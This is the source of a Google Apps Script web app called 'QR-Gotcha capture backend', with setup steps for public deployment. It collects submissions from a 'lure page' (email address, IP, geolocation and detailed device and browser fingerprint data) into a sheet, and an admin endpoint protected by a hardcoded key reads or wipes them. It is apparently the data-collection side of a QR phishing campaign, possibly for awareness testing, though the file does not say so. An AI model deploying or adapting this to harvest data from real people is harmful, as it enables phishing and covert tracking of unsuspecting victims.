/**
 * QR-Gotcha capture backend — Google Apps Script.
 *
 * SETUP (one time, ~2 minutes):
 *   1. Create a new Google Sheet, then Extensions → Apps Script.
 *   2. Delete the sample code, paste this whole file in, and set ADMIN_KEY below.
 *   3. Deploy → New deployment → type "Web app".
 *        - Execute as: Me
 *        - Who has access: Anyone
 *   4. Authorise it, then copy the Web app URL (ends in /exec).
 *   5. Paste that URL into index.html and admin.html (SCRIPT_URL), and set the
 *      same ADMIN_KEY in admin.html.
 *
 * The sheet fills itself — the first submission creates the "Captures" tab.
 */

var ADMIN_KEY  = 'gotcha-steer-7f3a9c';   // must match ADMIN_KEY in admin.html
var SHEET_NAME = 'Captures';
var HEADERS = ['time','email','ip','geo','os','browser','device','screen','viewport','lang','tz','platform','touch','ua'];

function sheet_() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sh = ss.getSheetByName(SHEET_NAME);
  if (!sh) {
    sh = ss.insertSheet(SHEET_NAME);
    sh.appendRow(HEADERS);
  }
  return sh;
}

// ---- Capture a submission (POST from the lure page) ----
function doPost(e) {
  try {
    var d = JSON.parse((e && e.postData && e.postData.contents) || '{}');
    var c = d.client || {};
    sheet_().appendRow([
      new Date().toISOString(),
      String(d.email || '').slice(0, 254),
      String(d.ip || '').slice(0, 60),
      String(d.geo || '').slice(0, 120),
      c.os || '', c.browser || '', c.device || '',
      c.screen || '', c.viewport || '', c.lang || '', c.tz || '', c.platform || '',
      c.touch ? 'yes' : 'no',
      String(c.ua || '').slice(0, 500)
    ]);
    return json_({ ok: true });
  } catch (err) {
    return json_({ ok: false, error: String(err) });
  }
}

// ---- Admin reads (JSONP from the admin console) ----
function doGet(e) {
  var p = (e && e.parameter) || {};
  var cb = p.callback;
  if (p.key !== ADMIN_KEY) return reply_({ error: 'forbidden' }, cb);

  if (p.action === 'clear') {
    var sh = sheet_();
    var last = sh.getLastRow();
    if (last > 1) sh.deleteRows(2, last - 1);
    return reply_({ ok: true }, cb);
  }

  // default: list
  var sh2 = sheet_();
  var vals = sh2.getDataRange().getValues();
  var head = vals.shift() || [];
  var items = vals.map(function (r) {
    var o = {};
    head.forEach(function (h, i) { o[h] = r[i]; });
    o.touch = (o.touch === 'yes');
    return o;
  });
  return reply_({ items: items }, cb);
}

function json_(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
function reply_(obj, cb) {
  if (cb) {
    return ContentService.createTextOutput(cb + '(' + JSON.stringify(obj) + ')')
      .setMimeType(ContentService.MimeType.JAVASCRIPT);
  }
  return json_(obj);
}
